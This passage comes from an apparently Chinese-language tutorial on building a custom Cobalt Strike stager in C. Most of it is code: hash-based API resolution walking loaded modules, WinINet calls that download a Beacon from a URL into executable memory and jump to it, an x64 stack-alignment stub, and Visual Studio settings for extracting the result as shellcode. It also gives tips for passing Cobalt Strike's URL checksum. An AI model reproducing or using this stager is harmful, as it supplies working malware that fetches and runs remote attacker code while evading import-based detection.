      dwExportDirRVA = pNTHeader->OptionalHeader.DataDirectory[0].VirtualAddress;
      // Get the next loaded module entry
      pDataTableEntry = (PMY_LDR_DATA_TABLE_ENTRY) pDataTableEntry->InLoadOrderLinks.Flink;
      // If the current module does not export any functions, move on to the next module.
      if (dwExportDirRVA == 0)
      {
       continue;
      }
      // Calculate the module hash
      for (i = 0; i = 0x61 )
       {
        dwModuleHash += *pTempChar - 0x20;
       }
       else
       {
        dwModuleHash += *pTempChar;
       }
      }
      pExportDir = (PIMAGE_EXPORT_DIRECTORY) ((ULONG_PTR) pModuleBase + dwExportDirRVA);
      dwNumFunctions = pExportDir->NumberOfNames;
      pdwFunctionNameBase = (PDWORD) ((PCHAR) pModuleBase + pExportDir->AddressOfNames);
      for (i = 0; i AddressOfNameOrdinals) + (2 * i));
        return (HMODULE) ((ULONG_PTR) pModuleBase + *(PDWORD)(((ULONG_PTR) pModuleBase + pExportDir->AddressOfFunctions) + (4 * usOrdinalTableIndex)));
       }
      }
     }
     // All modules have been exhausted and the function was not found.
     return NULL;
    }
在引用了以上代码后，我们还需要定义我们所需的 API 函数，这里我们尝试使用其它 API 进行测试：
    typedef HMODULE(WINAPI* FN_LoadLibraryA)(
        _In_ LPCSTR lpLibFileName
        );
    typedef LPVOID(WINAPI* FN_VirtualAlloc)(
        _In_opt_ LPVOID lpAddress,
        _In_ SIZE_T dwSize,
        _In_ DWORD flAllocationType,
        _In_ DWORD flProtect
        );
    typedef LPVOID(WINAPI* FN_InternetOpenA)(
        _In_ LPCSTR lpszAgent,
        _In_ DWORD dwAccessType,
        _In_ LPCSTR lpszProxy,
        _In_ LPCSTR lpszProxyBypass,
        _In_ DWORD dwFlags
        );
    typedef HANDLE(WINAPI* FN_InternetOpenUrlA)(
        _In_ LPVOID hInternet,
        _In_ LPCSTR lpszUrl,
        _In_ LPCSTR lpszHeaders,
        _In_ DWORD dwHeadersLength,
        _In_ DWORD dwFlags,
        _In_ DWORD_PTR dwContext
        );
    typedef BOOL(WINAPI* FN_InternetReadFile)(
        _In_ LPVOID hFile,
        _Out_ LPVOID lpBuffer,
        _In_ DWORD dwNumberOfBytesToRead,
        _Out_ LPDWORD lpdwNumberOfBytesRead
        );
    typedef struct tagApiInterface {
        FN_LoadLibraryA pfnLoadLibrary;
        FN_VirtualAlloc pfnVirtualAlloc;
        FN_InternetOpenA pfnInternetOpenA;
        FN_InternetOpenUrlA pfnInternetOpenUrlA;
        FN_InternetReadFile pfnInternetReadFile;
    }APIINTERFACE, * PAPIINTERFACE;
现在我们已经有了定义好的函数和 GetProcAddressWithHash 函数，接下来只需要通过 hash 寻找我们需要的函数即可：
    #pragma warning( push )
    #pragma warning( disable : 4055 )
        ai.pfnLoadLibrary = (FN_LoadLibraryA)GetProcAddressWithHash(0x0726774C);
        ai.pfnLoadLibrary(szWininet);
        ai.pfnLoadLibrary(szUser32);
        ai.pfnVirtualAlloc      = (FN_VirtualAlloc)GetProcAddressWithHash(0xE553A458);
        ai.pfnInternetOpenA     = (FN_InternetOpenA)GetProcAddressWithHash(0xA779563A);
        ai.pfnInternetOpenUrlA  = (FN_InternetOpenUrlA)GetProcAddressWithHash(0xF07A8777);
        ai.pfnInternetReadFile  = (FN_InternetReadFile)GetProcAddressWithHash(0xE2899612);
    #pragma warning( pop )
##### 4.1.2 建立连接接收Beacon
    LPVOID hInternet = ai.pfnInternetOpenA(0, 0, NULL, 0, NULL);
    HANDLE hInternetOpenUrl = ai.pfnInternetOpenUrlA(hInternet, HttpURL, NULL, 0, 0x80000000, 0);
    LPVOID addr = ai.pfnVirtualAlloc(0, 0x400000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    recv_tmp = 1;
    recv_tot = 0;
    beacon_index = addr;
    while (recv_tmp > 0) {
        ai.pfnInternetReadFile(hInternetOpenUrl, beacon_index, 8192, (PDWORD)&recv_tmp);
        recv_tot += recv_tmp;
        beacon_index += recv_tmp;
    }
    ((void(*)())addr)();
##### 4.1.3 64位下的代码调整
为了保证我们的 shellcode 在64位上以正确的堆栈对齐方式达到其入口点，我们需要编写一个保证对齐的 asm
存根，并将其生成的对象文件作为链接器的附加依赖项：
    EXTRN ExecutePayload:PROC
    PUBLIC  AlignRSP   ; Marking AlignRSP as PUBLIC allows for the function
         ; to be called as an extern in our C code.
    _TEXT SEGMENT
    ; AlignRSP is a simple call stub that ensures that the stack is 16-byte aligned prior
    ; to calling the entry point of the payload. This is necessary because 64-bit functions
    ; in Windows assume that they were called with 16-byte stack alignment. When amd64
    ; shellcode is executed, you can't be assured that you stack is 16-byte aligned. For example,
    ; if your shellcode lands with 8-byte stack alignment, any call to a Win32 function will likely
    ; crash upon calling any ASM instruction that utilizes XMM registers (which require 16-byte)
    ; alignment.
    AlignRSP PROC
     push rsi    ; Preserve RSI since we're stomping on it
     mov  rsi, rsp  ; Save the value of RSP so it can be restored
     and  rsp, 0FFFFFFFFFFFFFFF0h ; Align RSP to 16 bytes
     sub  rsp, 020h  ; Allocate homing space for ExecutePayload
     call ExecutePayload ; Call the entry point of the payload
     mov  rsp, rsi  ; Restore the original value of RSP
     pop  rsi    ; Restore RSI
     ret      ; Return to caller
    AlignRSP ENDP
    _TEXT ENDS
    END
我们还需要一个头文件帮助我们调用上面的汇编函数：
    #if defined(_WIN64)
    extern VOID AlignRSP( VOID );
    VOID Begin( VOID )
    {
     // Call the ASM stub that will guarantee 16-byte stack alignment.
     // The stub will then call the ExecutePayload.
     AlignRSP();
    }
    #endif
##### 4.1.4 其它坑点
（1）传入一些字符串参数时需要使用字符数组的形式；
（2）传入的字符串不能过长，太长的话会被编译器分配到别的区段导致提取的 shellcode 找不到其地址；
（3）如果 CS 使用默认的 profile，注意 URL 应满足 CS 的检查要求（checksum8）；
#### 4.2 修改VSStudio配置
在写好代码后，为了从我们编译生成的 exe 文件中提取出可以使用的 shellcode，我们还需要修改 VS 的部分配置选项：
编译器：
/GS- /TC /GL /W4 /O1 /nologo /Zl /FA /Os
链接器：
/LTCG "x64\Release\AdjustStack.obj" /ENTRY:"Begin" /OPT:REF /SAFESEH:NO
/SUBSYSTEM:CONSOLE /MAP /ORDER:@"function_link_order64.txt" /OPT:ICF /NOLOGO
/NODEFAULTLIB
其中 AdjustStack.obj 是我们上面提到的对象文件，function_link_order64.txt 是我们指定的链接顺序，其内容如下：
    Begin                       // 入口函数
    GetProcAddressWithHash
    ExecutePayload  // shellcode 功能函数
#### 4.3 提取shellcode上线
配置好相关选项后，构建项目生成 exe，然后提取 .text 段就可以拿到我们的 shellcode 了：
使用一个简单的加载器进行测试，可成功上线：
## 5\. 参考链接